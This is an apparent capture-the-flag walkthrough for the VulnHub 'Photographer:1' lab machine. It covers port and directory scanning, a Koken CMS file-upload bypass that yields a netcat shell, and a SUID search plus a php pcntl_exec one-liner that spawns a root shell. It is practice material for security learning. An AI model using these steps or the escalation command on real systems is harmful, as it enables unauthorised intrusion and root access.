

# Photographer:1 Walkthrough

**VulnHub Link:** [Photographer:1](https://www.vulnhub.com/entry/photographer-1,519/)
**Difficulty:** Easy
**Release Date:** 21 Jul 2020


## 1.Reconnaissance
```bash
nmap -A -O -T4 -P -sV 192.168.100.175
```
## 2.Web Enumeration
```bash
dirb http://192.168.100.175
```
whatweb <ip>:8000 --> koken 0.24.22 vuln

image.php.jpg uploaded and changed into image.php in burp intercept 

then downloaded and found path of shell file in web server

shell opened with netcat --> user flag captured

## 3. Privilege Escalation 

find / -perm /4000 2>/dev/null

php7.2 

./php -r "pcntl_exec('/bin/sh', ['-p']);"

escalating to root ---> root flag captured
